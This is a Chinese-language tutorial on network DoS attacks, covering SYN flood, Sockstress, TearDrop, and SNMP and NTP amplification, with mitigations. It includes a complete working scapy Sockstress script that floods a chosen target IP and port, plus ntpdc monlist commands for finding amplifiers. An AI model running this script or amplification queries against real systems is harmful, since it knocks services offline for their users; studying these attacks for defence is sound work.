协议只是约定

协议无法保证通信能够传达到

TCP三次握手连接过程，在连接过程中路由器只负责转发，协议建立连接之后链路并不是真正的存在，只是客户端和服务端一个约定；客户端给服务端发送SYN包，理想情况下服务端给客户端发送SYN+ACK包，客户端接收到后比对SYN包与SYN+ACK包中的ID，序列号相同，客户端就认为此SYN+ACK包是服务器返回的，而这个SYN+ACK包也可以是其他主机给客户端发送的，恰巧其他主机给客户端发送的SYN+ACK包中的ID，序列号与客户端自己发送SYN包中的ID，序列号也匹配，客户端也会认为收到了服务端的回应，客户端接收到SYN+ACK包后会发送一个ACK包，此时无论服务器端是否接收到ACK包，客户端就认为已经和服务端建立连接；若服务器端收到了ACK包，服务器端也会认为和客户端建立连接；假设服务端没收到ACK包，客户端根本不知道，想要让客户端知道服务端没收到ACK包，服务端就只能再发送ACK+ACK包，以此类推，任何一方都不知道对方是否接收到自己发送的数据包，只是客户端与服务端之间的约定。

Syn-Flood

  • Syn洪水攻击
  • 常伴随IP欺骗
    • 真正的攻击目标

Syn-Flood攻击方式：

攻击者向服务器发送大量的SYN包，服务器发送给攻击者SYN+ACK包后，攻击就会将SYN+ACK包丢弃，不给服务器返回ACK包；正常情况下客户端会给服务端发送ACK包，因此服务端就会等SYN包的发起方将第三个ACK包发送给自己，大量的SYN包导致服务器会被挂起，服务器会维持大量的没有完整建立起来的TCP连接会话，导致服务器操作系统可以支持的最大的TCP的连接数上限占满，当再有新的TCP请求进来的时候，这台服务器从操作系统层面就再也没有响应了。虽然服务器有超时机制，但发动的是泛洪攻击。

Sockstress

  • 2008年由Jack C. Louis 发现
  • 针对TCP服务的拒绝服务攻击
    • 消耗被攻击目标系统资源
    • 与攻击目标建立大量的socket连接
    • 完成三次握手，最后的ACK包 window 大小为 0（客户端不接收数据）
    • 攻击者资源消耗小（CPU、内存、带宽）
    • 异步攻击，单机可拒绝服务高配资源服务器
    • Window 窗口实现的 TCP 流控
  • 原理
    • 客户端与服务器TCP通信的时候会有协商机制，客户端要通知服务器客户端自己的window有多大（能够接收多大的数据），服务器也会告诉客户端服务器自己的window有多大；客户端与服务器每次传输数据时侯都会利用window窗口实现TCP流控，保证了TCP传输可靠性。在客户端给服务器第三次握手发送ACK包时候其中就会带有window字段大小；若此时将第三次握手ACK包中的window大小修改为0，就会导致客户端接收不到数据。对于攻击者，只要发送完最后的ACK包，不需要维持socket连接。

sockstress.py

#!/usr/bin/python
# -*- coding: utf-8 -*-

from scapy.all import *
from time import sleep
import _thread
import logging
import os
import signal
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

if len(sys.argv) !=4:
    print("用法: ./sock_stress.py [目标IP] [端口] [线程数]")
    print("举例: ./sock_stress.py 10.0.0.5 21 20 ## 请确定呗攻击端口处于开放状态")
    sys.exit()

target = str(sys.argv[1])
dstport = int(sys.argv[2])
threads = int(sys.argv[3])

# 攻击函数
def sockstress(target, dstport):
    while 0==0:
        try:
            x = random.randint(0, 65535)
            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags='S'),timeout=1,verbose=0)
            send(IP(dst=target)/TCP(dport=dstport, sport=x, window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00', verbose=0)
        except:
            pass

# 停止攻击函数
def shutdown(signal, frame):
    print('正在恢复 iptables 规则')
    os.system('iptables -D OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
    sys.exit()

# 添加iptables规则
os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
signal.signal(signal.SIGINT, shutdown)

# 多线程攻击
print("\n攻击正在进行...按 Ctrl+C 停止攻击")

for x in range(0,threads):
    _thread.start_new_thread(sockstress, (target,dstport))

# 永远执行
while 0==0:
    sleep(1)

防御措施

  • 直到今天sockstress攻击仍然是一种很有效的DoS攻击方式
  • 由于建立完整的TCP三步握手，因此使用syn cookie防御无效
  • 根本的防御方法是采用白名单（不切实际）
  • 折中对策：限制单位时间内每IP建立的TCP连接数
    • 封杀每30秒与80端口建立连接超过10个的IP地址
    • iptables -I INPUT -p tcp –dport 80 -m state –state NEW -m recent –set
    • iptables -I INPUT -p tcp –dport 80 -m state –state NEW -m recent –update –seconds 30 –hitcount 10 -j DROP
    • 以上规则对DDoS攻击无效

TearDrop

  • 泪滴
  • 主要针对早期微软操作系统（95、98、3.x、nt）
    • 2.x版本的android系统、6.0 IOS系统攻击有效
  • 攻击效果
    • 被攻击者蓝屏、重启、卡死
  • 攻击向量并不确定，要视具体协议分析
  • 原理
    • 正常情况：第一个包IPID为1；分片后第二个包的IPID保持为1，但不再有上层包头(TCP/UDP头)，直接将成为IP数据报的数据段；第一片数据包IP头中会标记后面还有一个数据段，其中offset起始偏移量是从上层包头+数据段整体来算(从上层包头第一个字节到数据段最后一个字节，第一个字节按0开始算)，假设第一个片数据段末端偏移量值为1479，第二片数据的起始偏移量则为1480，由于是分片，一个大的整体数据包，第二片开始往后不会再加TCP/UDP头部，直接传输数据部分。
    • 攻击情况：基于正常情况下，修改offset偏移量的值，假设将第二片的1481修改为1461，这样就会导致接收端接收到第二片数据时，数据会有重合部分导致数据叠加起来，不同的操作系统遇到这样的异常数据段处理方法不同就会导致系统出现异常。

FCS：帧校验序列，4个字节

SNMP放大攻击

  • 简单网络管理协议
    • 服务器端口 UDP 161 / 162
    • 管理站（manager / 客户端）、被管理设备（agent / 服务端）
    • 管理信息数据库（MIB）是一个信息存储库，包含管理代理中的有关配置和性能
    • 每一个节点都有一个对象标识符（OID）来唯一的标识
    • IETF定义标准的MIB库 / 厂家自定义MIB库
  • SNMP主要工作原理
    • 通过一台客户端机器向一个被管理的设备发出查询请求获取这台设备当前运行状态的检测等情况，网络监控一般是基于SNMP与Agent。
  • 攻击原理
    • 请求流量小，查询结果返回流量大
    • 结合伪造源地址实现攻击

NTP放大攻击

  • 网络时间协议
    • Network Time Protocol
    • 保证网络设备时间同步
    • 电子设备互相干扰导致时钟差异越来越大
    • 影响应用正常运行、日志审计不可信
    • 服务端口 UDP 123
  • 攻击原理
    • NTP 服务器 monlist（MON_GETLIST）查询功能
      • 监控 NTP 服务器的状况
    • 客户端查询时，NTP服务器返回最后同步时间的600个客户端IP
      • 每6个IP一个数据包，最多100个数据包（放大约100倍）
  • NTP攻击对策
    • 升级到 ntpd 4.2.7p26 及以上的版本（默认关闭monlist查询）
    • 手动关闭monlist查询功能

开启ntp服务

  • service ntp start

发现NTP服务

  • nmap -sU -p123

发现monlist

  • ntpdc -n -c monlist 1.1.1.1

-n：不解析域名，直接以IP形式显示查询结果

-c：command，具体命令

Request timed out目标服务器不接受monlist查询类型，无法利用monlist进行攻击；

当安装完ntp服务后默认关闭monlist

开启monlist功能

  • vim /etc/ntp.conf

禁用这两条指令即可

查询

  • ntpdc -n -c monlist 127.0.0.1

  • ntpq -c rv 127.0.0.1

  • ntpdc -c sysinfo 127.0.0.1
